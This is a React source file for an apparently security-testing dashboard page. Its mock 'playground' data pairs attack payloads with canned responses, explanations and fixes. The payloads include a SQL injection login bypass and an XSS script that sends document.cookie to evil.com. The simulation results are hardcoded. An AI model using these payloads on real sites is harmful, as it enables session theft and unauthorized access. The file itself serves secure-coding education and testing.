import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Download,
  Filter,
  Play,
  X,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Lightbulb,
  Code,
  Terminal,
  RefreshCw,
  Zap,
} from "lucide-react";
import { PageHeader } from "@/components/PageHeader";
import { edgeCases, type EdgeCase } from "@/lib/mock-data";

export const Route = createFileRoute("/dashboard/tests")({
  head: () => ({ meta: [{ title: "Edge Cases — CodeGuardian AI" }] }),
  component: Tests,
});

const frameworks = ["All", "Jest", "Pytest", "Postman"] as const;

// Mock playground data for different edge case types
const playgroundData: Record<string, {
  payload: string;
  response: { status: number; message: string; vulnerable?: boolean };
  explanation: string;
  fix: string;
}> = {
  "Injection": {
    payload: `{
  "email": "' OR 1=1 --",
  "password": "x"
}`,
    response: {
      status: 401,
      message: "Authentication failed",
      vulnerable: false,
    },
    explanation: "SQL injection attempts to manipulate database queries by injecting malicious SQL code. The payload ' OR 1=1 -- tries to bypass authentication by making the WHERE clause always true. A secure system should use parameterized queries that treat user input as data, not executable code.",
    fix: "Use parameterized queries with PDO or prepared statements:\n\n$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');\n$stmt->execute(['email' => $email]);",
  },
  "Null & Undefined": {
    payload: `{
  "lineItems": null,
  "customerId": "cust_123"
}`,
    response: {
      status: 400,
      message: "Validation Error: lineItems must be an array",
      vulnerable: false,
    },
    explanation: "Null/undefined inputs test how your application handles missing or invalid data. Many vulnerabilities arise from improper null handling, leading to crashes, type errors, or security bypasses. Robust validation should reject null values where objects/arrays are expected.",
    fix: "Add input validation:\n\nif (!Array.isArray(lineItems)) {\n  throw new ValidationError('lineItems must be an array');\n}",
  },
  "Oversized Payload": {
    payload: `POST /upload HTTP/1.1
Content-Length: 27262976
Content-Type: multipart/form-data

[26MB binary data...]`,
    response: {
      status: 413,
      message: "Payload Too Large: Maximum upload size is 25MB",
      vulnerable: false,
    },
    explanation: "Oversized payload attacks attempt to overwhelm servers with massive requests, causing memory exhaustion, slow processing, or denial of service. Proper systems enforce strict size limits at the web server and application layers.",
    fix: "Configure request size limits:\n\n// Express.js\napp.use(express.json({ limit: '25mb' }));\n\n// Nginx\nclient_max_body_size 25M;",
  },
  "Unicode": {
    payload: `{
  "username": "علي👾🌸",
  "bio": "a\\u0301".repeat(50)
}`,
    response: {
      status: 400,
      message: "Validation Error: Username contains invalid combining marks",
      vulnerable: false,
    },
    explanation: "Unicode edge cases test handling of international characters, emoji, and combining marks. Attackers can exploit poor Unicode handling to bypass filters, cause rendering issues, or create homograph attacks. Proper validation should normalize Unicode and limit combining characters.",
    fix: "Normalize and validate Unicode:\n\nconst normalized = username.normalize('NFC');\nif (normalized.length > 50 || /[\\u0300-\\u036f]{3,}/.test(normalized)) {\n  throw new ValidationError('Invalid username format');\n}",
  },
  "Race Condition": {
    payload: `// Concurrent requests
Promise.all([
  charge(orderId, 100),
  charge(orderId, 100)
])`,
    response: {
      status: 409,
      message: "Conflict: Order already processed",
      vulnerable: false,
    },
    explanation: "Race conditions occur when multiple operations access shared resources simultaneously without proper synchronization. In payment systems, this can lead to double-charging or inventory overselling. Proper systems use database locks, idempotency keys, or distributed locks.",
    fix: "Implement idempotency with locks:\n\n// Use database transaction with row lock\nBEGIN TRANSACTION;\nSELECT * FROM orders WHERE id = ? FOR UPDATE;\n// Process payment\nUPDATE orders SET status = 'charged';\nCOMMIT;",
  },
  "Auth": {
    payload: `GET /api/user/profile HTTP/1.1
Authorization: Bearer eyJhbGc...expired_token`,
    response: {
      status: 401,
      message: "Unauthorized: Token expired",
      vulnerable: false,
    },
    explanation: "Authentication edge cases test token validation, expiration handling, and session management. Expired or malformed tokens should be rejected immediately. Proper systems validate token signatures, expiration times, and claims before granting access.",
    fix: "Validate JWT tokens properly:\n\nconst decoded = jwt.verify(token, SECRET_KEY);\nif (decoded.exp < Date.now() / 1000) {\n  throw new AuthError('Token expired');\n}",
  },
  "Malformed JSON": {
    payload: `POST /webhook HTTP/1.1
Content-Type: application/json

{not valid json`,
    response: {
      status: 400,
      message: "Bad Request: Invalid JSON payload",
      vulnerable: false,
    },
    explanation: "Malformed JSON tests parser robustness. Attackers send broken JSON to trigger parser errors, expose stack traces, or cause crashes. Secure systems catch JSON parsing errors and return generic error messages without exposing internals.",
    fix: "Handle JSON parsing errors:\n\ntry {\n  const data = JSON.parse(body);\n} catch (e) {\n  return res.status(400).json({ error: 'Invalid JSON' });\n}",
  },
  "XSS": {
    payload: `{
  "productName": "<script>fetch('evil.com?c='+document.cookie)</script>"
}`,
    response: {
      status: 200,
      message: "Product added successfully (XSS payload sanitized)",
      vulnerable: false,
    },
    explanation: "Cross-Site Scripting (XSS) attacks inject malicious scripts into web pages. When user input is rendered without escaping, attackers can steal cookies, hijack sessions, or deface pages. Proper systems escape HTML entities or use Content Security Policy.",
    fix: "Escape HTML or use textContent:\n\n// React (auto-escapes)\n<div>{productName}</div>\n\n// Vanilla JS\nelement.textContent = productName; // Safe\n// NOT: element.innerHTML = productName; // Unsafe",
  },
};

function Tests() {
  const [fw, setFw] = useState<(typeof frameworks)[number]>("All");
  const [selectedCase, setSelectedCase] = useState<EdgeCase | null>(null);
  const [isSimulating, setIsSimulating] = useState(false);
  const [simulationResult, setSimulationResult] = useState<any>(null);

  const filtered = fw === "All" ? edgeCases : edgeCases.filter((e) => e.framework === fw);

  const handleRunSimulation = async () => {
    if (!selectedCase) return;

    setIsSimulating(true);
    setSimulationResult(null);

    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1200));

    const data = playgroundData[selectedCase.category] || playgroundData["Injection"];
    setSimulationResult(data.response);
    setIsSimulating(false);
  };

  const handleTryAnother = () => {
    setSimulationResult(null);
  };

  return (
    <>
      <PageHeader
        eyebrow="intelligent edge cases"
        title="Tests your team forgot to write"
        description="Null inputs, injection payloads, oversized bodies, race conditions, Unicode chaos — generated and ready to drop in."
        actions={
          <button className="inline-flex items-center gap-2 rounded-full bg-brand-navy px-4 py-2 text-sm font-semibold text-brand-cream retro-border retro-shadow-pink hover:bg-brand-navy/90 transition-colors">
            <Download className="h-4 w-4" /> Export bundle
          </button>
        }
      />

      <div className="mb-6 flex flex-wrap items-center gap-2">
        <Filter className="h-4 w-4 text-muted-foreground" />
        {frameworks.map((f) => (
          <button
            key={f}
            onClick={() => setFw(f)}
            className={`rounded-full px-3 py-1 text-xs font-semibold retro-border transition ${
              fw === f ? "bg-brand-pink text-white" : "bg-white text-brand-navy hover:bg-gray-50"
            }`}
          >
            {f}
          </button>
        ))}
      </div>

      <div className="grid gap-5 lg:grid-cols-2">
        {filtered.map((e, i) => (
          <motion.div
            key={e.id}
            initial={{ opacity: 0, y: 14 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.04 }}
            onClick={() => setSelectedCase(e)}
            className="rounded-3xl bg-white p-5 retro-border retro-shadow cursor-pointer hover:shadow-lg hover:scale-[1.02] transition-all group"
          >
            <div className="flex items-center justify-between">
              <span className="rounded-full bg-brand-yellow px-2.5 py-1 text-[11px] font-semibold uppercase tracking-wider text-brand-navy retro-border">
                {e.category}
              </span>
              <div className="flex items-center gap-2">
                <span className="font-mono text-xs text-muted-foreground">{e.framework}</span>
                <Play className="h-4 w-4 text-brand-pink opacity-0 group-hover:opacity-100 transition-opacity" />
              </div>
            </div>
            <h3 className="mt-3 font-display text-lg font-semibold group-hover:text-brand-pink transition-colors">
              {e.name}
            </h3>
            <pre className="mt-3 overflow-x-auto rounded-2xl bg-brand-navy p-4 font-mono text-[12px] leading-relaxed text-brand-cream retro-border">
              <code>{e.code}</code>
            </pre>
          </motion.div>
        ))}
      </div>

      {/* Interactive Playground Modal */}
      <AnimatePresence>
        {selectedCase && (
          <>
            {/* Backdrop */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setSelectedCase(null)}
              className="fixed inset-0 z-50 bg-brand-navy/80 backdrop-blur-sm flex items-center justify-center p-4"
            >
              {/* Modal */}
              <motion.div
                initial={{ opacity: 0, scale: 0.95, y: 20 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.95, y: 20 }}
                onClick={(e) => e.stopPropagation()}
                className="relative w-full max-w-4xl max-h-[90vh] overflow-y-auto rounded-3xl bg-brand-cream retro-border retro-shadow"
              >
                <div className="p-8">
                  {/* Header */}
                  <div className="flex items-start justify-between mb-6">
                    <div className="flex items-center gap-3">
                      <div className="rounded-xl bg-brand-yellow/20 p-3">
                        <Zap className="h-6 w-6 text-brand-yellow" />
                      </div>
                      <div>
                        <h2 className="font-display text-2xl font-semibold text-brand-navy">
                          Edge Case Playground
                        </h2>
                        <p className="text-sm text-gray-600">{selectedCase.category} Testing Lab</p>
                      </div>
                    </div>
                    <button
                      onClick={() => setSelectedCase(null)}
                      className="rounded-lg p-2 hover:bg-white/50 transition-colors"
                    >
                      <X className="h-5 w-5 text-gray-500" />
                    </button>
                  </div>

                  {/* Test Title */}
                  <div className="mb-6">
                    <div className="flex items-center gap-2 mb-2">
                      <span className="rounded-full bg-brand-yellow px-2.5 py-1 text-[11px] font-semibold uppercase tracking-wider text-brand-navy retro-border">
                        {selectedCase.category}
                      </span>
                      <span className="font-mono text-xs text-gray-600">{selectedCase.framework}</span>
                    </div>
                    <h3 className="font-display text-xl font-semibold text-brand-navy">
                      {selectedCase.name}
                    </h3>
                  </div>

                  {/* Two Column Layout */}
                  <div className="grid gap-6 lg:grid-cols-2">
                    {/* Left: Payload & Response */}
                    <div className="space-y-4">
                      {/* Editable Payload */}
                      <div>
                        <div className="flex items-center gap-2 mb-2">
                          <Code className="h-4 w-4 text-brand-pink" />
                          <label className="text-xs font-semibold uppercase tracking-wider text-gray-600">
                            Attack Payload
                          </label>
                        </div>
                        <div className="rounded-2xl bg-brand-navy p-4 retro-border">
                          <pre className="font-mono text-xs text-brand-cream leading-relaxed overflow-x-auto">
                            <code>{playgroundData[selectedCase.category]?.payload || selectedCase.code}</code>
                          </pre>
                        </div>
                      </div>

                      {/* Run Simulation Button */}
                      <button
                        onClick={handleRunSimulation}
                        disabled={isSimulating}
                        className="w-full inline-flex items-center justify-center gap-2 rounded-full bg-brand-pink px-6 py-3 text-sm font-semibold text-white retro-border retro-shadow hover:bg-brand-orange transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        {isSimulating ? (
                          <>
                            <RefreshCw className="h-4 w-4 animate-spin" />
                            Simulating...
                          </>
                        ) : (
                          <>
                            <Play className="h-4 w-4" />
                            Run Simulation
                          </>
                        )}
                      </button>

                      {/* Simulated Response */}
                      <AnimatePresence>
                        {simulationResult && (
                          <motion.div
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -10 }}
                          >
                            <div className="flex items-center gap-2 mb-2">
                              <Terminal className="h-4 w-4 text-brand-teal" />
                              <label className="text-xs font-semibold uppercase tracking-wider text-gray-600">
                                API Response
                              </label>
                            </div>
                            <div
                              className={`rounded-2xl p-4 retro-border ${
                                simulationResult.status >= 400
                                  ? "bg-red-50 border-red-300"
                                  : "bg-green-50 border-green-300"
                              }`}
                            >
                              <div className="flex items-start gap-3">
                                {simulationResult.status >= 400 ? (
                                  <XCircle className="h-5 w-5 text-red-500 shrink-0 mt-0.5" />
                                ) : (
                                  <CheckCircle className="h-5 w-5 text-green-500 shrink-0 mt-0.5" />
                                )}
                                <div className="flex-1">
                                  <div className="flex items-center gap-2 mb-1">
                                    <span
                                      className={`font-mono text-sm font-bold ${
                                        simulationResult.status >= 400 ? "text-red-600" : "text-green-600"
                                      }`}
                                    >
                                      {simulationResult.status}
                                    </span>
                                    <span className="text-xs text-gray-600">
                                      {simulationResult.status >= 400 ? "Error" : "Success"}
                                    </span>
                                  </div>
                                  <p className="text-sm text-gray-700">{simulationResult.message}</p>
                                  {simulationResult.vulnerable !== undefined && (
                                    <div className="mt-2 flex items-center gap-2">
                                      {simulationResult.vulnerable ? (
                                        <span className="rounded-full bg-red-500 px-2 py-0.5 text-[10px] font-bold uppercase text-white">
                                          Vulnerable
                                        </span>
                                      ) : (
                                        <span className="rounded-full bg-green-500 px-2 py-0.5 text-[10px] font-bold uppercase text-white">
                                          Protected
                                        </span>
                                      )}
                                    </div>
                                  )}
                                </div>
                              </div>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>

                    {/* Right: Explanation & Fix */}
                    <div className="space-y-4">
                      {/* AI Explanation */}
                      <div>
                        <div className="flex items-center gap-2 mb-2">
                          <Lightbulb className="h-4 w-4 text-yellow-500" />
                          <label className="text-xs font-semibold uppercase tracking-wider text-gray-600">
                            AI Explanation
                          </label>
                        </div>
                        <div className="rounded-2xl bg-white p-4 retro-border">
                          <p className="text-sm text-gray-700 leading-relaxed">
                            {playgroundData[selectedCase.category]?.explanation ||
                              "This edge case tests system behavior under unusual or malicious inputs."}
                          </p>
                        </div>
                      </div>

                      {/* Recommended Fix */}
                      <div>
                        <div className="flex items-center gap-2 mb-2">
                          <AlertTriangle className="h-4 w-4 text-brand-orange" />
                          <label className="text-xs font-semibold uppercase tracking-wider text-gray-600">
                            Recommended Fix
                          </label>
                        </div>
                        <div className="rounded-2xl bg-brand-navy p-4 retro-border">
                          <pre className="font-mono text-xs text-brand-cream leading-relaxed overflow-x-auto whitespace-pre-wrap">
                            <code>
                              {playgroundData[selectedCase.category]?.fix ||
                                "Implement proper input validation and sanitization."}
                            </code>
                          </pre>
                        </div>
                      </div>

                      {/* Try Another Button */}
                      {simulationResult && (
                        <motion.button
                          initial={{ opacity: 0, scale: 0.95 }}
                          animate={{ opacity: 1, scale: 1 }}
                          onClick={handleTryAnother}
                          className="w-full inline-flex items-center justify-center gap-2 rounded-full bg-brand-navy px-6 py-3 text-sm font-semibold text-brand-cream retro-border hover:bg-brand-navy/90 transition-colors"
                        >
                          <RefreshCw className="h-4 w-4" />
                          Try Another Attack
                        </motion.button>
                      )}
                    </div>
                  </div>

                  {/* Original Test Code */}
                  <div className="mt-6">
                    <div className="flex items-center gap-2 mb-2">
                      <Code className="h-4 w-4 text-gray-500" />
                      <label className="text-xs font-semibold uppercase tracking-wider text-gray-600">
                        Generated Test Code
                      </label>
                    </div>
                    <div className="rounded-2xl bg-white p-4 retro-border">
                      <pre className="font-mono text-xs text-gray-700 leading-relaxed overflow-x-auto">
                        <code>{selectedCase.code}</code>
                      </pre>
                    </div>
                  </div>
                </div>
              </motion.div>
            </motion.div>
          </>
        )}
      </AnimatePresence>
    </>
  );
}

// Made with Bob
